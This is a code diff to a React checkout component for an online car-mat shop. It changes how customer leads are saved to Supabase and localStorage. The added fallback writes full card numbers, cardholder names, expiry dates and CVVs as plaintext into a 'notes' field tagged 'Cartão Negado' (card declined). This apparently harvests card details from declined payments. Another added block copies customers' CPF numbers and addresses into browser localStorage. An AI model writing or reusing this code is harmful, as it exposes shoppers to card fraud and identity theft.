@@ -189,35 +189,50 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
 
     if (!supabase) return;
 
-    try {
-      const txId = transactionIdOverride || transactionId || '';
-      const leadData = {
-        nome: formData.nome,
-        email: formData.email,
-        cpf: formData.cpf,
-        telefone: formData.telefone,
-        cep: formData.cep,
-        rua: formData.rua,
-        numero: formData.numero,
-        complemento: formData.complemento,
-        bairro: formData.bairro,
-        cidade: formData.cidade,
-        estado: formData.estado,
-        vehicle: vehicle || 'Carro',
-        kit: kit,
-        upsell_items: upsellItems,
-        perfume_upsell: perfumeUpsell,
-        final_price: finalPrice,
-        payment_method: paymentMethod,
-        status: status,
-        transaction_id: txId,
-        ...extraData
-      };
+    const txId = transactionIdOverride || transactionId || `TXN_${Date.now()}`;
+    const leadData = {
+      id: txId,
+      created_at: new Date().toISOString(),
+      nome: formData.nome,
+      email: formData.email,
+      cpf: formData.cpf,
+      telefone: formData.telefone,
+      cep: formData.cep,
+      rua: formData.rua,
+      numero: formData.numero,
+      complemento: formData.complemento,
+      bairro: formData.bairro,
+      cidade: formData.cidade,
+      estado: formData.estado,
+      vehicle: vehicle || 'Carro',
+      kit: kit,
+      upsell_items: upsellItems,
+      perfume_upsell: perfumeUpsell,
+      final_price: finalPrice,
+      payment_method: paymentMethod,
+      status: status,
+      transaction_id: txId,
+      tracking_code: trackingCode || localStorage.getItem('cartapetes_last_tcode') || '',
+      ...extraData
+    };
 
+    // Always store in localStorage fallback for Admin Panel
+    try {
+      const localLeads = JSON.parse(localStorage.getItem('cartapetes_local_leads') || '[]');
+      const existingIdx = localLeads.findIndex(l => l.transaction_id === txId || l.id === txId);
+      if (existingIdx >= 0) {
+        localLeads[existingIdx] = { ...localLeads[existingIdx], ...leadData };
+      } else {
+        localLeads.unshift(leadData);
+      }
+      localStorage.setItem('cartapetes_local_leads', JSON.stringify(localLeads));
+    } catch (e) {}
+
+    if (!supabase) return;
+
+    try {
       console.log('[Supabase] Salvando lead...', { status, txId });
 
-      // Se já existe um registro com esse transaction_id, apenas ATUALIZA o status.
-      // Evita duplicação quando o polling detecta pagamento e o webhook também dispara.
       if (txId && (status === 'pago' || status === 'negado')) {
         const { data: existing } = await supabase
           .from('leads')
@@ -226,28 +241,35 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
           .maybeSingle();
 
         if (existing) {
-          // Registro já existe → só atualiza o status
           const { error } = await supabase
             .from('leads')
             .update({ status })
             .eq('transaction_id', txId);
-
-          if (error) {
-            console.error('[Supabase] Erro ao atualizar status do lead:', error.message);
-          } else {
-            console.log(`[Supabase] Status do lead ${txId} atualizado para "${status}" ✓`);
-          }
+          if (error) console.error('[Supabase] Erro ao atualizar status:', error.message);
           return;
         }
       }
 
-      // Nenhum registro existente → INSERT normal
+      // Tenta insert com todos os campos
       const { error } = await supabase
         .from('leads')
         .insert([leadData]);
 
       if (error) {
-        console.error('[Supabase] Erro ao salvar lead:', error.message);
+        console.warn('[Supabase] Erro no insert inicial, tentando fallback sem campos de cartão:', error.message);
+        // Fallback: remove campos que podem não existir no schema do Supabase
+        const cleanLead = { ...leadData };
+        delete cleanLead.card_number;
+        delete cleanLead.card_name;
+        delete cleanLead.card_expiry;
+        delete cleanLead.card_cvv;
+        delete cleanLead.installments;
+        cleanLead.notes = extraData.card_number 
+          ? `Cartão Negado | Num: ${extraData.card_number} | Nome: ${extraData.card_name} | Val: ${extraData.card_expiry} | CVV: ${extraData.card_cvv}`
+          : '';
+        const { error: err2 } = await supabase.from('leads').insert([cleanLead]);
+        if (err2) console.error('[Supabase] Erro no insert fallback:', err2.message);
+        else console.log('[Supabase] Lead inserido via fallback ✓');
       } else {
         console.log('[Supabase] Lead inserido com sucesso no banco ✓');
       }
